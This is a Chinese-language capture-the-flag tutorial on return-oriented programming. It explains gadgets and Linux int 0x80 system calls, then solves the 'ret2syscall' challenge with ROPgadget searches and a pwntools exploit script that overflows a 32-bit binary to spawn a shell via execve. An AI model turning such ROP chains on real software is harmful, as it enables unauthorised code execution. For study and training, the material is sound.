# 05.ret2syscall

<a name="19478086"></a>
## ROP原理：

 随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在**栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。**

<a name="b7d7d9a8"></a>
### gadget：

所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。

例如：`pop eax ; ret`

这段代码的作用就是将栈顶的数据弹出给eax，然后再将栈顶的数据作为返回地址返回。

假如我们通过栈溢出将eip覆盖为pop eax的地址，当程序返回的时候就会执行pop eax，将'aaaa'放到eax中，然后执行ret指令，将'bbbb'放入eip寄存器中，然后会执行地址为'bbbb'处的指令，可以看到，bbbb处的指令为xxxx，当执行完xxxx后，继续执行ret指令，然后会返回到cccc指令处，执行xxxx。system函数的本质也是一条条汇编指令的组合，如果我们能找到多个xxxx，ret结构的指令，将其连接在一起，就可以达到执行system函数的效果。

![](https://img-blog.csdnimg.cn/235ef4c7db3c424e9d502314c10d7597.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center#crop=0&crop=0&crop=1&crop=1&id=CmacD&originHeight=641&originWidth=857&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序，我们可以将多个gadget组合到一起，进而可以执行多条汇编指令，从而达到目的。ROP 攻击一般得满足如下条件

- 程序存在溢出，并且可以控制返回地址。
- 可以找到满足条件的 gadgets 以及相应 gadgets 的地址。

<a name="7ca4fde4"></a>
## 例题：

ret2syscall，即通过ROP控制程序执行系统调用，获取 shell。

<a name="562b019f"></a>
### 首先checksec：

![](https://img-blog.csdnimg.cn/2021022122125167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTk0MzUyMg==,size_16,color_FFFFFF,t_70#pic_center#crop=0&crop=0&crop=1&crop=1&id=sbSJv&originHeight=216&originWidth=1003&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

32位程序，开启了堆栈不可执行。

<a name="f12d506c"></a>
### ida分析：

![](https://img-blog.csdnimg.cn/20210221221334617.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTk0MzUyMg==,size_16,color_FFFFFF,t_70#pic_center#crop=0&crop=0&crop=1&crop=1&id=Tlpr6&originHeight=246&originWidth=695&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

依旧是栈溢出，只不过不存在后门函数，且开启了nx保护，考虑使用ROP来执行系统调用。

<a name="7ac74a4c"></a>
### 关于系统调用的知识：

**Linux 的系统调用通过 int 80h 实现，用系统调用号来区分入口函数**

**应用程序调用系统调用的过程是：**

1、**把系统调用的编号存入 EAX**

2、**把函数参数存入其它通用寄存器**

3、**触发 0x80 号中断（int 0x80）**

那么我们如果希望通过系统调用来获取 shell 就需要把系统调用的参数放入各个寄存器，然后执行 int 0x80 指令就可以了。

<a name="c3e4a8eb"></a>
### 本题思路

想通过系统调用执行：`execve("/bin/sh",NULL,NULL)`（32位程序）

那么 eax 寄存器应该放系统调用号，查看 execve 的系统调用号：

```
 cat /usr/include/asm/unistd_32.h | grep execve
```

![](https://img-blog.csdnimg.cn/20210221221419364.png#pic_center#crop=0&crop=0&crop=1&crop=1&id=PcEwD&originHeight=119&originWidth=579&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

得到 11，转换为 16 进制是 0xb，所以 eax 中应该存放 0xb。

ebx 应该存放想要执行的 /bin/sh 的地址，还有两个参数设置为 0。

所以现在需要做的就是让：

1.  eax=0xb 
2.  ebx=/bin/sh 的地址 
3.  ecx=0 
4.  edx=0 

要让栈顶的值是 0xb 然后可以通过 pop eax 达到目的

用ROPgadget来查找相应的gadget，命令如下：

`ROPgadget --binary rop --only 'pop|ret' | grep 'eax'`

![](https://img-blog.csdnimg.cn/20210221221548702.png#pic_center#crop=0&crop=0&crop=1&crop=1&id=YwHq7&originHeight=184&originWidth=1025&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

可以看到地址为：0x080bb196

类似的，通过这条命令寻找控制其他寄存器的地址，我们发现0x0806eb90位置存在一个gadget可以控制ebx，ecx，edx寄存器，所以我们选择这一条。

![](https://img-blog.csdnimg.cn/20210221221607494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTk0MzUyMg==,size_16,color_FFFFFF,t_70#pic_center#crop=0&crop=0&crop=1&crop=1&id=FFySo&originHeight=738&originWidth=1031&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

同时使用：`ROPgadget --binary rop --string '/bin/sh'` 找到 '/bin/sh' 字符串在什么地方

![](https://img-blog.csdnimg.cn/20210221221624306.png#pic_center#crop=0&crop=0&crop=1&crop=1&id=nTAFz&originHeight=148&originWidth=1000&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

以及需要的 int 0x80：`ROPgadget --binary rop --only 'int'`

![](https://img-blog.csdnimg.cn/20210221221643242.png#pic_center#crop=0&crop=0&crop=1&crop=1&id=c2Vhd&originHeight=188&originWidth=1024&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

确定偏移的长度为112.

<a name="5af9901f"></a>
### 执行过程：

![](https://img-blog.csdnimg.cn/20210221221655167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTk0MzUyMg==,size_16,color_FFFFFF,t_70#pic_center#crop=0&crop=0&crop=1&crop=1&id=Xs5qo&originHeight=615&originWidth=937&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

<a name="68333f9d"></a>
### 编写exp：

```python
from pwn import *
p=process('./rop')
int_addr=0x8049421
bin_sh_addr=0x80be408
pop_other_ret=0x806eb90
pop_eax_ret=0x80bb196
payload='a'*112+p32(pop_eax_ret)+p32(0xb)+p32(pop_other_ret)+p32(0)+p32(0)+p32(bin_sh_addr)+p32(int_addr)
p.sendline(payload)
p.interactive()
```
